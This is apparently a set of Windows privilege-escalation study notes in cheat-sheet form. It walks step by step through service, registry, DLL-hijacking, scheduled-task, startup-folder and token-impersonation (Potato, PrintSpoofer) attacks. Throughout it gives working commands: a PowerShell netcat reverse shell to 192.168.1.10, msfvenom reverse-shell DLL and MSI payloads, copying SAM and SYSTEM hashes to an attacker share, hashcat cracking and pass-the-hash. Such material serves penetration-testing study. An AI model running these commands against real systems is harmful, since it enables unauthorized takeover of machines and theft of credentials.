## Strategy 

1. check user (`whoami`) and groups (`net user <username>`)
2. check if you have credentials for any user on the system
	- if yes, try executing a process as that user 
	- if you have PowerShell, download netcat and run:
	```powershell
	 $username = '<username here>'
	 $password = '<password here>'
	 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
	 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
	 Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
	```
	then `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"`
3. run winPEAS with "fast", "searchfast", and "cmd" options so you quickly look over the results and see if anything is highlighted
	- you can run winPEAS again without these options and let it search the filesystem if you initial scan did not find anything 
	- spend time reading over your enumeration results and create a checklist of findings to go through -- this will help avoid rabbit holes
	- look around for files in your user's desktop and other common locations (e.g. "C:\" and "C:\Program Files") -- read through these as they may contain useful information that could help escalate privileges
	- try things that don's have many steps first (e.g. registry exploits, services, etc.) 
	- look at admin processes, enumerate their version and search for exploits
	- check for internal ports that might be able to forward to your attacking machine, especially if the exploit seems to only work when running on Linux
4. run Seatbelt and other scripts as well
5. if scripts are failing you can run manual command (listed below), or use Windows privilege escalation cheatsheets [online](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
6. if you still don't have an admin shell, re-read your full enumeration dumps and highlight anything that seems odd (i.e. process or filenames you aren't familiar with) -- at this stage you can also start thinking about kernel exploits 
7. it might take time but don't give up

--- 
--- 

<br>

# Techniques

<br>

### -> Kernel Exploits

Process:
1. enumerate Windows version and patch level (`systeminfo`)
2. find matching exploits (Google, ExploitDB, GitHub)
	- can use [Windows Exploit Suggester](https://github.com/bitsadmin/wesng) to do this, which takes the output of `systeminfo` (i.e. `python wes.py systeminfo.txt -i 'Elevation of Prililege' --exploits-only | more`)
	- can use [Waston](https://github.com/rasta-mouse/Watson) to enumerate kernel exploits
3. compile and run exploit
	- can find popular pre-compiled kernel exploit on [SecWiki GitHub](https://github.com/SecWiki/windows-kernel-exploits)

--- 

### -> Service Exploits

Useful service commands:
- query the configuration of a serivce: `sc.exe qc <name>`
- query the current status of a service: `sc.exe query <name>`
- modify a configuration option of a service: `sc.exe config <name> <option>= <value>`
- start/stop a service: `net start/stop <name>`

<br>

Insercure Service Properties
> Each service has an ACL which defines certain service-specific permissions; some are innocous (e.g. SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS), some may be useful (SERVICE_STOP, SERVICE_START), and some are dangerous (SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS)
> If a user has permission to change the configuration of a service which runs with SYSTEM privileges, you can change the executable the servicec users to your own. However, if you can change a service configuration but cannot stop/start the service, you man not be able to escalate privileges (this potential rabbit hole applies to all service privilege escalations).

1. enumerate service information to check if the current user can modify any services
	- with winPEAS: `winPEASany.exe quiet servicesinfo` -- look at the "Modifiable Services" section
	- with accesschk: `.\accesschk.exe /accepteula -uwcqv user <service>` 
	- look for SERVICE_CHANGE_CONFIG and SERVICE_START / SERVICE_STOP permissions
2. query the vulnerable service configuration to see what it currently does:
	- i.e. `sc qc <service>`
	- check the START_TYPE, where the binary path, any dependencies, and who the service runs as
3. query the current state of the service:
	- i.e. `sc query <service>`
	- if stopped you can just start it to trigger the exploit, if running then you need to stop it and then start it again
4. if you have the right to modify any part of a service, the easiest way to escalate privileges is to set the binary path to that of the reverse shell payload:
	- i.e. `sc config <service> binpath="<path\to\payload\>"`
5. start listener on local machine and start the service
	- i.e. `net start <service>`

<br>

Unquoted Service Paths
> spaces in paths to service binaries raise ambiguity in Windows which the OS resolves by checking each of the possibilities in turn (e.g. a space can represent a binary and an argument). If you can write to a location Windows checks before the actual executable, you can trick the service into executing instead. More info [here](https://gracefulsecurity.com/privesc-unquoted-service-path/)

1. look at output of privilege escalation script (e.g. winPEAS) for unquoted service paths
	- or check unquoted paths for services with `wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"`
2. check if you have permissions to start the service found on the unquoated service path
	- i.e. `sc.exe qc <service>`
3. check if you have write permissions on any of the directories in the unquoted service path 
	- i.e. with access check: `.\accesschk.exe \accepteula -ucqv C:\` -> `.\accesschk.exe \accepteula -ucqv "C:\Program Files"` -> `.\accesschk.exe \accepteula -ucqv "C:\Program Files\Unquoted Path Service\"`
	- or check groups the user is in `net user <username>` -> then check what privileges this group has `icacls <services>`
4. if you find a writeable directory on the service path, copy the payload (reverse shell) to that directory and name it to be that of the binary 
	- i.e. `copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`
5. start a listener on local machine and restart the service
	- i.e. `net start <service>`
- be aware of naming the executable you created so it matches on parameter expansion (i.e. try the first name of the real service executable with a `.exe` extension)

<br>

Weak Registry Permissions
> the Windows registry stores entries for each service and these have ACLs. If the ACL is missed configured, it may be possible to modify a service's configuration even if you cannot modify the service directly

1. look at output of privilege escalation script (e.g. winPEAS) for any service registry entries you can modify 
2. verify these permissions with either PowerShell or AccessCheck
	- i.e. `powershell -exec bypass` -> `Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List`
	- i.e. `.\accesschk.exe \accepteula -uvwqk HKLM:\System\CurrentControlSet\Services\regsvc`
	- if the "NT AUTHORITY\INTERACTIVE" group has "KEY_ALL_ACCESS" permissions then you can modify this service
3. check if you can restart the service
	- i.e. `.\accesschk.exe \accepteula -ucqv user regsvc`
4. check the current values in the service registry entry
	- i.e. `reg query HKLM:\System\CurrentControlSet\Services\regsvc`
5. overwrite the service's ImagePath registry entry to point to your reverse shell (has the same effect as chaning the BinPath of the service)
	- i.e. `reg add HKLM:\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Temp\reverse.exe /f`
6. start a listener on local machine and restart the service
	- i.e. `net start regsvc`

<br>

Insecure Service Executables
> if the original service executable is modifiably by the current user, you can simply replace it with your reverse shell executable. Remember to create a backup of the original executable if you are exploiting a real system.

1. look at output of privelege esclation script (e.g. winPEAS) for any service executable which is writeable by current user (or everyone)
2. verify with AccessCheck
	- i.e. `.\accesschk.exe /accepteula -quvw "C:\Program File\File Permissions Service\filepermservice.exe"`
3. check if you can restart the service
	- i.e. `.\accesschk.exe \accepteula -ucqv user filepermsvc`
4. backup the original service executable
	- i.e. `copy "C:\Program File\File Permissions Service\filepermservice.exe" C:\Temp`
5. overwrite the original service executable
	- i.e. `copy C:\Temp\reverse.exe "C:\Program File\File Permissions Service\filepermservice.exe"`
6. start a listener on local machine and restart the service
	- i.e. `net start filepermsvc`

<br>

DLL Hijacking 
> Often a service will try to load functionality from a libary called a DLL (dynamic-link library) and whatever functionality provided will be executed with the same permissions as the service that loaded it. If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writeable by your user.
> A more common misconfiguration that can be used to escalate privileges is if a DLL is missing from the system, and your user has write access to a directory within the PATH that Windows searches for DLLs in. Unfortunately, initial detection of vulnerable services is difficult and often the entire process is very manual 

1. look at output of privilege escalation script (e.g. winPEAS) for any service which is non-Microsoft and if there are any writeable directories in the PATH 
2. check which non-Microsoft services the current user has permissions to start and stop 
	- i.e. `accesschk.exe /accepteula -uvqc user <service>`
	- repeat this until you find a service the user can start/stop
3. check the DLL binary executable that this service uses
	- i.e. `sc qc <service>`
4. copy the binary off the system and onto a machine you have Admin rights for to analyse the file:
	- run ProcMon with Admin privileges -> stop and clear the current capture using button -> press `<Ctrl> + l` to open the Filter Configuration -> add a new filter on the Process Name matching the name of the binary executable -> de-select the Show Registry Activity and Show Network Activity buttons -> start the capture again
	- on a regular command prompt start the service (`net start <service>`)
	- in ProcMon look for "NAME NOT FOUND" errors and the associate DLL name which is not found -> look to see if it does search the writeable directory on the PATH
5. on Kali machine, create a reverse shell payload with the DLL format
	- i.e. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.145 LPORT=53 -f dll -o <name_of_missing_DLL>.dll`
6. upload the payload to the target machine and to the writeable directory on the PATH
	- i.e. `copy \\192.168.2.145\hijackme.dll C:\<writeable_directory>`
6. start a listener on local machine and restart the service
	- i.e. `net stop <service>` -> `net start <service>`

---
 
 ### -> Registry Exploits
 
 AutoRuns
 > Windows can be configured to automatically run commands at startup, with elevated privilge, and these "AutoRuns" are configured ni the Registry. If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted), you may be able to escalate privileges
 
 1. run winPEAS with the applicationsinfo check and look for AutoRun applications that the current user can write to 
	 - i.e. `.\winPEASany.exe quiet applicationsinfo`
	 - this can be done manually by querying the registry for a list of AutoRun programs: `query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	 - then for each one use AccessCheck to verify the permissions on the executable: `.\accesschk.exe /accepteula -wvu <path/to/executable>`
2. create a backup of the original executable:
	- i.e. `copy "C:\Program Files\Autorun Program\program.exe" C:\Temp`
3. overwrite the original executable with your reverse shell:
	- i.e. `copy /Y reverse.exe "C:\Program Files\Autorun Program\program.exe"`
4. setup a listener on local machine and restart Windows

<br>

AlwaysInstallElevated
> MSI files are package files used to install applications and always run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated (admin) permissions and, if this is the case, you can generate a malicious MSI file which contains a reverse shell.
> However, this only works if two registry settings are configured. The "AlwaysInstallElevated" value must be set to 1 for both the local machine: *HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer* and the current user: *HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer*
> If either of these are missing or disabled, the exploit will not work

1. run winPEAS with the windowscreds check and look to see if the "AlwaysInstallElevated" keys are set to 1
	- i.e. `.\winPEASany.exe quiet windowscreds` 
2. verify this manually by querying the registry for these keys 
	- i.e. `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
	- i.e. `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
3. create an MSI reverse shell on the local machine
	- i.e. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.4.3 LPORT=53 -f msi -o reverse.msi`
4. upload the reverse shell 
	- i.e. `copy \\192.168.4.3\reverse.msi .`
5. setup a listener on the local machine and execute the reverse MSI 
	- i.e. `msiexec /quiet /qn /i reverse.msi`
	
--- 

### -> Passwords

> Finding passwords or trying to re-use password is the easiest way to esclate privileges.

<br>

Registry
> Plenty of programs store configuration options in the Windows Registry and Windows itself sometimes stores password in plaintext in the Registry. So it's always worth searching the Registry for passwords.

- to search the Registry for keys and values that contain "password" on the local machine: `reg query HKLM /f password /t REG_SZ /s`
- to search the Registry for keys and values that contain "password" for the current user: `reg query HKCU /f password /t REG_SZ /s`
- this usually generates a lot of results, so often it is more fruitful to look in known locations with privilege esclation scripts

1. run winPEAS with the filesinfo and user infochecks
	- i.e. `.\winPEASany.exe quiet filesinfo userinfo`
2. search the results for credentials
	- can verify results by querying the registry keys found
	- i.e. `reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s`
3. use winexe to spawn a shell with the found credentials on local machine
	- i.e. `winexe -U 'admin%password123' //192.168.1.22 cmd.exe`
	- use the `--system` option to spawn a system shell (i.e. `winexe -U 'admin%password123' --system //192.168.1.22 cmd.exe`)

<br>

Saved Credentials
> Windows has a `runas` command which allows users to run commands with the privileges of other users, usually requiring the knowledge of the other user's password. However, Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement

1. run winPEAS with the cmd and windowscreds checks, and look for any currently stored credentials
	- i.e. `.\winPEASany.exe quiet cmd windowscreds`
	- this can be verified by running: `cmdkey /list`
2. start a listener on the local machine 
3. use the `runas` command to execute a reverse shell using the saved credentials
	- i.e. `runas /savedcred /user:admin C:\Temp\reverse.exe`
	
<br>

Configuration Files
> Some admins will leave configuration files on the system with passwords in them. The "Unattend.xml" file is an example of this and it allows for the largely automated setup of Windows systems.

- to recursively search for files in the current directory with "pass" in the name, or ending in ".config" run: `dir /s *pass* == *.config`
- to recursively search for files in the current directory that contain the word "password" and also end in either .xml, .ini, or .txt run: `findstr /si password *.xml *.ini *.txt`
- run in directories you think might be important, such as the user's home directory, temporary directories, and directories for suspicious programs

1. run winPEAS with the cmd, searchfast, and filesinfo checks
	- i.e. `.\winPEASany.exe quiet cmd searchfast filesinfo`
2. search through the results for the section which lists the files which are known to contain creds
3. print the contents of these files to see if there is any password information 
	- i.e. `type C:\Windows\Panther\Unattend.xml`
	- you may need to decode passwords found (i.e. if base64 encoded, in Kali run: `echo "<encoded_password>" | base64 -d`)
4. use winexe to spawn a shell with the found credentials on local machine
	- i.e. `winexe -U 'admin%password123' //192.168.1.22 cmd.exe`
	- use the `--system` option to spawn a system shell (i.e. `winexe -U 'admin%password123' --system //192.168.1.22 cmd.exe`)

<br>

SAM
> Windows stores password hashes in the Security Account Manager (SAM), effectively a database file. These hashes are encrypted with a key which can be found in a file named SYSTEM. Thus, if you have the ability to read the SAM and the SYSTEM files, you can extract the hashes and decrypt them.
> The SAM and SYSTEM files are located in the C:\Windows\System32\config directory, but are locked while Windows is running. However, backups of the files may exist in the C:\Windows\Repair or C:\Windows\System32\config\RegBack directories.

1. run winPEAS with the cmd, searchfast, and filesinfo checks
	- i.e. `.\winPEASany.exe quiet cmd searchfast filesinfo`
2. search through the results for the section which lists the files which are known to contain creds for the SAM and SYSTEM files
3. copy these two file back to the local Kali machine
	- i.e. `copy C:\Windows\Repair\SAM \\192.168.1.11\`
	- i.e. `copy C:\Windows\Repair\SYSTEM \\192.168.1.11\`
4. clone the latest version of the creddump7 suit: `git clone https://github.com/Neohapsis/creddump7.git && cd creddump7/`
5. use `pwdump.py` to decrypt the hashes and dump them
	- i.e. `python2 pwdump.py SYSTEM SAM
	- the first part of the hash is an LM hash and is decrypted, so is always the hash of an empty string 
	- the second of the hash is the NTLM hash, if this hash starts with "31d6" (an empty string) then it usually means this account has no password or is disabled
6. crack legitimate hashed password using `hashcat`
	- i.e. `hashcat -m 1000 --force <NTLM_hash> /usr/share/wordlists/rockyou.txt
7. use the cracked password with winexe to spawn a shell on the local machine
	- i.e. `winexe -U 'admin%password123' //192.168.1.22 cmd.exe`
	- use the `--system` option to spawn a system shell (i.e. `winexe -U 'admin%password123' --system //192.168.1.22 cmd.exe`)

<br>

Passing the Hash
> Windows accepts hashes instead of passwords to authenticate a number of services. You can use a modified version of `winexe`, called `pth-winexe`, to spawn a command prompt using the admin user's hash.

1. obtain the admin user's password hash (see above)
2. use `pth-winexe` to spawn a shell on the local Kali machine
	- i.e. `winexe -U 'admin%<password_hash>' //192.168.1.22 cmd.exe`
	- note, you need to use the entire password hash, including the LM hash
	- use the `--system` option to spawn a system shell 
	
--- 

### -> Scheduled Tasks

> Windows can be configured to run tasks at specific time, periodically (e.g. every 5 mins), or when triggered by some event (e.g. a user logon). Tasks usually run with the privileges of the user who created them, however admins can configure tasks to run as other users, including SYSTEM.
> Unfortunately, there is no easy method for enumerating custom tasks that belong to other users as a low privileged user account 

- to list all scheduled tasks your user can see run: `schtasks /query /fo LIST /v`
- or in PowerShell run: `Get-ScheduleTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State`
- often you have to rely on other clues, such as finding a script or log file that indicate a schedule task is being run 

1. explore the system for clues of schedule tasks 
	- i.e. PowerShell scripts, log files, bat files, etc.
2. view the contents of the clue to deduce information about the scheduled task
	- i.e `type CleanUp.ps1`
3. use AccesCheck to check you permissions for scripts related to scheduled task
	- i.e. `.\accesschk.exe /accepteula -quv user CleanUp.ps1`
	- if you can write to the file, insert your own commands and they will be run as SYSTEM when the script executes (if SYSTEM is the owner)
4. create a backup of the script 
	- i.e. `copy CleanUp.ps1 C:\Temp`
5. start a listener on local Kali machine 
6. append to the script, making a call to execute your reverse shell
	- i.e. `echo C:\Temp\reverse.exe >> CleanUp.ps1`
7. wait till the script gets run by the scheduled task to gain a reverse shell 

--- 

### -> Insecure GUI Apps (Citrix Method)

> On some (older) versions of Windows, users could be granted the permission to run certain GUI apps with admin privileges. There are often numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality. Since the parent process is runnign with admin privileges, the spawned command prompt will also run with these privileges. 
> The method demonstrated here is called the "Citrix Method" because it uses many of the same techniques used to break out of Citrix environments.

1. find GUI apps running with admin privileges
	- i.e. start GUI app and in a command prompt run: `tasklist /v | findstr <app_name>.exe` to find what privileges the GUI app is running with 
2. spawn a command prompt from within the GUI app by going to File -> Open -> then in the navigation bar entering `file://c:/windows/system32/cmd.exe` and press Enter to spawn an admin command prompt

---

### -> Startup Apps
> Each user can define apps that start when they login by placing shortcuts to them in a specific directory. Windows also has a startup directory for apps that should start for all users: "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp". If you can create files in this directory, you can put your reverse shell executable and escalate privileges when an admin logs in.

1. user AccessCheck to check permissions on the global "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" directory
	- i.e. `.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`
	- if the "BUILTIN\Users" group has write access then you can put your reverse shell in this directory 
2. create a VBS script to generate a .lnk shortcut file to run the reverse shell in the StartUp directory
	- i.e. CreateShort.vbs:
	```basic
	Set oWS = WScript.CreateObject("WScript.Shell")
	sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
	Set oLink = oWS.CreateShortcut(sLinkFile)
	oLink.TargetPath = "C:\PrivEsc\reverse.exe"
	oLink.Save
	```
3. use `cscript` to generate the .lnk shortcut 
	- i.e. `cscript CreateShortcut.vbs`
4. start a listener on the local Kali machine
5. logout and wait for the admin user to login to get a reverse shell

---

### -> Installed Apps

> Most exploitations of installed applications are based on the misconfigurations already discussed (e.g. weak file/registry permissions, insercure services paths, etc.). However, some of these exploit utilise buffer overflows or more advanced techniques.

1. enumerate all running applications with `tasklist`, or use `seatbelt.exe` to search for non-standard processes, or use winPEAS to find all running applications
	- i.e. `tasklist /V`
	- i.e. `.\seatbelt.exe NonstandardProcesses` -- shows the full path of the executable (useful for determing version numbers
	- i.e. `.\winPEASany.exe quiet processinfo`
2. once you find an interesting process, use ExploitDB to search for the process
	- some exploits will contain instructions, while others are full programs you will need to compile and run on the system

---

### -> Hot Potato

> Hot Potato is the name of an attack that uses a spoofing attack along with an NTLM relay attack to gain SYSTEM privileges. The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command execution.
> This attack works on Windows 7, 8, early versions of Windows 10, and their server counterparts.

1. copy the Hot Potato binary to the Windows target machine 
2. setup a listener on the local Kali machine 
3. run the Hot Potato binary, giving it command line options; IP address of the Windows machine (`-ip`), to run the reverse shell (`-cmd`)
	- i.e. `.\potato.exe -ip 192.168.1.2 -cmd "C:\Temp\reverse.exe"`
	- for Windows 7 append the following options: `-enable_http server true`, `-enable_defender true`, `-enable_spoof true`, `-enable_exhaust true`
	- i.e. `.\potato.exe -ip 192.168.1.2 -cmd "C:\Temp\reverse.exe" -enable_http server true -enable_defender true -enable_spoof true -enable_exhaust true`
	
--- 

### -> Token Impersonation

Service Accounts
> Service accounts can be given special privileges in order for them to run their services, and cannot be logged into directly. Unfortunately, multiple problems have been found with service accounts, making them easier to escalate privileges with.

Rotten Potato
> The original Rotten Potato exploit was identified in 2016 and it exploited the fact that service accounts could intercept a SYSTEM ticket and use it to impersonate the SYSTEM user. This was possible because service accounts usually have the "SeImpersonatePrivilege" privilege enable.

SeImpersonate / SeAssignPrimaryToken
> Service accounts are generally configured with these two privileges and they allow the account to impersonate the access tokens of other users (including the SYSTEM user). Any user with these privileges can run token impersonation exploits. 

Juicy Potato
> Rotten Potato was quite a limited exploit, however led to Juicy Potato which works in the same way but the authors did extensive research and found many more ways to exploit the issue than the original across Windows versions. It can be downloaded from https://github.com/ohpe/juicy-potato. 

1. check privileges of the current user: `whoami /priv`, and look out for SeImpersonatePrivilege or SeAssignPrivilege
2. start a listener on local Kali machine
3. upload Juice Potato exploit onto target and run
	- i.e. `JuicyPotato.exe -l 1337 reverse.exe -t * -c {<cls_id>}`
	- the CLS ID can be found on the [JuicyPotato GItHub project](https://github.com/ohpe/juicy-potato)

<br> 

Rogue Potato
> Rogue Potato is the latest in the series of "Potato" exploit and it can be found at https://github.com/antonioCoco/RoguePotato

1. on local Kali machine setup a socat redirector to redirect traffic from port 135 to port 9999 on the Windows target 
	- i.e. `sudo socat tcp-listen:135,reuseaddr,fork tcp:<target_ip>:9999 
2. get a reverse shell on the target machine, running as a service account 
3. check the privileges of the reverse shell with: `whoami /priv` -- looking for SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege
4. setup a netcat listener on local Kali machine
4. run the Rogue Potato exploit on the target machine, telling it to use Kali IP address as it's redirector, to listen on port 9999, and to execute the reverse shell executable
	- i.e. `RoguePotato.exe -r <local_IP> -l 9999 -e reverse.exe`
	
<br>

PrintSpoofer
> An exploit which targets the Print Spooler service and uses token impersonation techniques to execute commands as the SYSTEM user. Unlike Rogue Potato, it doesn't require any port forwarding and the entire exploit happens on the target machine. It can be downloaded at https://github.com/itm4n/PrintSpoofer

1. get a reverse shell on the target machine, running as a service account 
2. check the privileges of the reverse shell with: `whoami /priv` -- looking for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
3. setup a netcat listener on local Kali machine 
4. upload and run the Print Spoofer exploit on the target machine, telling it to execute the reverse shell
	- i.e. `PrintSpoofer.exe -i -c reverse.exe`

---

### -> Port Forwarding

> Sometimes it is easier to run exploit code in Kali, but the vulnerable program is listening on an internal port. In these cases you need to forward a port on Kali to the internal port on Windows and you can do this with a program called `plink.exe` (from the makers of PuTTY). 

1. upload `plink.exe` to the Windows target machine and run it
	- syntax: `.\plink.exe <user>@<local_ip> -R <local_port>:<target_ip>:<target_port>`
	- i.e `.\plink.exe root@192.168.33.2 -R 445:127.0.0.1:445`
	- SSH needs to be enabled on the Kali machine 
2. once an SSH session is established all traffic directed to local port 445 on Kali machine will be forwarded to port 445 on the Windows machine, over the SSH connection
3. now you can run commands directed to local port 445 and have them connect to an internal service running on the Windows target
	
--- 

### -> getsystem (Named Pipes & Token Duplication)

> `getsystem` is  command in Metasploit's Meterpreter shell which automatically esclates privileges for you. The command can use three techniques to "get system" and if you don't specify a specific technique it will run all three until either one succeeds or they all fail.
> It should not be thought of as a user to admin privilege escalation method in any modern system.

Technique 1: Named Pipe Impersonation (in memory/admin)
> This technique creates a named pipe controlled by Meterpreter and a service (running as SYSTEM) which runs a command that interacts directly with the named pipe. Metepreter then impersonates the connected process to get an impersonation access token (with the SYSTEM security context) and assigns this access token to all subsequent Meterpreter threads, meaning they run with SYSTEM privileges
> This technique required local admin privileges.

Technique 2: Named Pipe Impersonation (dropper/admin)
> Very similar to Named Pipe Impersonation (in memory/admin), with the only difference being that a DLL is written to disk and a service is created which runs the DLL as SYSTEM. The DLL connects to the named pipe.
> This technique required local admin privileges.

Technique 3: Token Duplication (in memory/admin)
> This technique requires the "SeDebugPrivilege" and it only works on x86 architectures. It finds a service running as SYSTEM which it injects a DLL into. This DLL duplicates the access token of the service and assigns it to Metepreter. This is the only technique that does not have to create a service, and operates entirely in memory.

---

### -> User Privileges

> In Windows, user accounts and groups can be assigned specific "privileges" and these grant access to certain abilities. Some of these abilities can be used to escalate your overall privileges to that of SYSTEM (a details paper can be found [here](https://github.com/hatRiot/token-priv)

- the `whoami /priv` command can be used to list a current user's privileges.
- note that "disabled" in the state column is irrelevant here; if the privilege is listed, your user has it (even if it is not enabled for the current process)

**SeImpersonatePrivilege**
> The SeImpersonatePrivilege grants the ability to impersonate any access token which it can obtain. If an access token from a SYSTEM process can be obtained, then a new process can be spawned using that token. The Juicy Potato exploit abuses this ability.

**SeAssignPrimaryPrivilege**
> The SeAssignPrimaryPrivilege is similar to SeImpersonatePrivilege as it enables a user to assign an access token to a new process. This is also exploited in the Juicy Potato exploit.

**SeBackupPrivilege**
> The SeBackupPrivilege grants *read* access to all objects on the system, regardless of their ACL. Using this privilege, a user could gain access to sensitive files, or extract hashes from the registry which could then be cracked or used in a pass-the-hash attack.

**SeRestorePrivilege**
> The SeRestorePrivilege grants *write* access to all objects on the system, regardless of their ACL. There are a multitude of ways to abuse this privilege; modify service binaries, overwrite DLLs used by SYSTEM processes, modify registry settings, etc. 

**SeTakeOwenershipPrivilege**
> The SeTakeOwenershipPrivilege lets the user take ownership over an object (the WRITE_OWNER permission). Once you own an object, you can modify its ACL and grant yourself write access. The same methods used with SeRestorePrivilege then apply. 

Other privileges (more advanced)
- SeTcbPrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeDebugPrivilege (used by getsystem)

---

### -> PowerShell

- users often embed their credentials in PowerShell scripts in obfuscated ways (i.e. base64 encoded, etc.)
- if you come across PowerShell scripts on a system, and the current user is a member of the 'Event Log Readers' group, run `Get-EventLog -LogName 'Windows PowerShell' -Newest 1000 | Select-Object -Property * | out-file </path/to/output_file>` to see what recent commands have been run 
- from here you can inspect interesting commands and de-obfuscate them to see if user credentials are stored 
- see the following de-obfuscation tactics :
	- https://medium.com/mii-cybersec/malicious-powershell-deobfuscation-using-cyberchef-dfb9faff29f 
	- https://www.offensive-security.com/offsec/powershell-obfuscation/